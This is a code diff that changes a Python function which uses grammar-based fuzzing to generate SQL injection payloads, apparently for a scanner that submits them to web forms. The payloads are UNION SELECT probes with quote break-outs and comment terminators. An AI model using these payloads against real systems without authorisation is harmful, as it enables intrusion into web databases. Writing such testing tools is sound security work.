@@ -111,27 +111,38 @@ def submit_form(driver, form_details, url, value) -> dict:
     return result
 
 
-def generate_payload() -> list[str]:
+def generate_payload(count: int) -> list[str]:
     SQL_Injection_Grammar: Grammar = {
         '<start>': ['<sql>'],
-        '<sql>': ['<special-symbol><space><union><annotation>'],
-        '<space>': [' ', '%0a', '%09', '/**/', '+', '%0c'],
+        '<sql>': ['<special-symbol> <union><annotation>'],
         '<special-symbol>': ['', '1"', "1'", "'", '"', '1)', '")', "')", '1))', '"))', "'))"],
-        '<union>': ['union select "fu" "" "zz"', 'union select hex("fu" "" "zz")',
-                    'union select 1, "fu" "" "zz"', 'union select 1, hex("fu" "" "zz")'],
+        '<union>': ['union select "fu" "" "zz"', 'union select hex("fu" "" "zz")'],
+        '<annotation>': ['#', '-- xx', '%23', ';%00']
+    }
+
+    SQL_Injection_Grammar2: Grammar = {
+        '<start>': ['<sql>'],
+        '<sql>': ['<special-symbol> <union><annotation>'],
+        '<special-symbol>': ['', '1"', "1'", "'", '"', '1)', '")', "')", '1))', '"))', "'))"],
+        '<union>': ['union select 1, "fu" "" "zz"', 'union select 1, hex("fu" "" "zz")'],
         '<annotation>': ['#', '-- xx', '%23', ';%00']
     }
 
     payloads: list[str] = []
 
-    for _ in range(70):
-        sql_injection_fuzzer = GrammarFuzzer(SQL_Injection_Grammar, max_nonterminals=10)
-        payload: str = sql_injection_fuzzer.fuzz()
+    sql_injection_fuzzer = GrammarFuzzer(SQL_Injection_Grammar, max_nonterminals=11)
+    sql_injection_fuzzer2 = GrammarFuzzer(SQL_Injection_Grammar2, max_nonterminals=11)
+    payloads = set()
 
-        if payload not in payloads:
-            payloads.append(payload)
+    while len(payloads) < (count // 2):
+        payload = sql_injection_fuzzer.fuzz()
+        payloads.add(payload)
 
-    payloads = list(set(payloads))
+    while len(payloads) < count:
+        payload = sql_injection_fuzzer2.fuzz()
+        payloads.add(payload)
+
+    payloads = list(payloads)
 
     return payloads
 
